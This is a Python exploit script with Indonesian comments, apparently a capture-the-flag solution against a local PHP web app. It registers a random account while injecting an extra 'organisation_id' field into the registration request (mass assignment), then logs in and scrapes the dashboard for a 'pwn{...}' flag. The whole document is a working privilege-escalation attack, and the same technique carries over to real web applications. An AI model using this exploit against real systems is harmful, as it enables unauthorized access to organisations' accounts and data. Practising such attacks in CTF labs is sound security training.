import requests
import random
import string
import re

# Sesuaikan Port
URL = "http://localhost:1340"

def exploit():
    s = requests.Session()
    
    # 1. Bikin User Random
    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    password = "password123"
    print(f"[*] Target: {URL}")
    print(f"[*] Attempting Mass Assignment Register as: {username}")
    
    # 2. Payload Register Jahat
    # Kita sisipin 'organisation_id': '1'
    payload = {
        'username': username,
        'password': password,
        'confirm_password': password,
        'organisation_id': '1'  # <--- INI KUNCINYA
    }
    
    try:
        # Register
        r = s.post(f"{URL}/register.php", data=payload)
        
        # 3. Login
        print("[*] Logging in...")
        s.post(f"{URL}/auth.php", data={
            'username': username,
            'password': password
        })
        
        # 4. Cek Dashboard buat Flag
        r = s.get(f"{URL}/dashboard.php")
        
        if r.status_code == 200:
            print("[+] Dashboard Accessed!")
            
            # Cari Flag
            flag = re.search(r'pwn\{.*?\}', r.text)
            if flag:
                print(f"\n[!!!] FLAG FOUND: {flag.group(0)}\n")
            else:
                # Cek Organisation ID kita skrg apa
                print("[-] Flag not found. Debugging content...")
                # Biasanya dashboard nampilin status member
                if "Member" in r.text or "Admin" in r.text:
                    print("[+] We are Member/Admin, but regex missed.")
                print(r.text[:300])
        else:
            print(f"[-] Login Failed? Status: {r.status_code}")

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()
